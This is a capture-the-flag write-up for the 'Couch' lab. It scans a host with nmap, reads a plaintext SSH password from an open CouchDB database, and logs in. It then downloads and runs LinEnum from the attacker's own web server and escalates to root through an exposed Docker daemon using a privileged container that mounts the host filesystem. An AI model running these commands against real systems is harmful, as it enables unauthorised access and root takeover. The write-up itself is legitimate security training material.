# Couch
Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.
## Difficulty: Easy

## Information Gatherings
```bash
nmap -sC -sV 10.201.15.188 -oN couch_nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 15:53 WIB
Nmap scan report for 10.201.15.188
Host is up (0.44s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.52 seconds
```
Trying `-p 22,80,5984`

because when I searched in the browser `couch database whice port working` the result came up `Apache CouchDB typically uses TCP port 5984 for its main HTTP interface, which handles most of the interaction with the database.`
```bash
nmap -sC -sV 10.201.15.188 -p 22,80,5984  -oN couch_nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 15:57 WIB
Nmap scan report for 10.201.15.188
Host is up (0.28s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
80/tcp   closed http
5984/tcp open   http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds
```
## Enumeration
We found 2 port open `port 22 & 5984`

Next search in browser `http://10.201.15.188:5984/`
```
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```
Next `10.201.15.188:5984/_utils/`
and `http://10.201.15.188:5984/_all_dbs/`

In `http://10.201.15.188:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7`

We found password backup
```
atena:t4qfzcc4qN##
```
## Exploit
```bash
ssh atena@10.201.15.188
The authenticity of host '10.201.15.188 (10.201.15.188)' can't be established.
ED25519 key fingerprint is SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.15.188' (ED25519) to the list of known hosts.
atena@10.201.15.188's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
atena@ubuntu:~$ 
```
```bash
atena@ubuntu:~$ ls
user.txt
```
`Yeyy we found user.txt!`

## Privilege Escalation
```bash
atena@ubuntu:~$ sudo -l
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
```
```bash
atena@ubuntu:~$ find / -perm -u=s 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/bin/fusermount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
```bash
atena@ubuntu:~$ cd /tmp
```
```bash
santstyle ~/Toolspython3 -m http.server
```
```bash
atena@ubuntu:/tmp$ wget LinEnum.sh
```
```bah
atena@ubuntu:/tmp$ chmod +x LinEnum.sh
atena@ubuntu:/tmp$ ./LinEnum.sh
```
We found this `docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
`
```bash
atena@ubuntu:/tmp$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt /bin/sh
/ # whoami
root
```
```bash
# cd root
# ls
root.txt
```
`Finnaly we found root.txt!`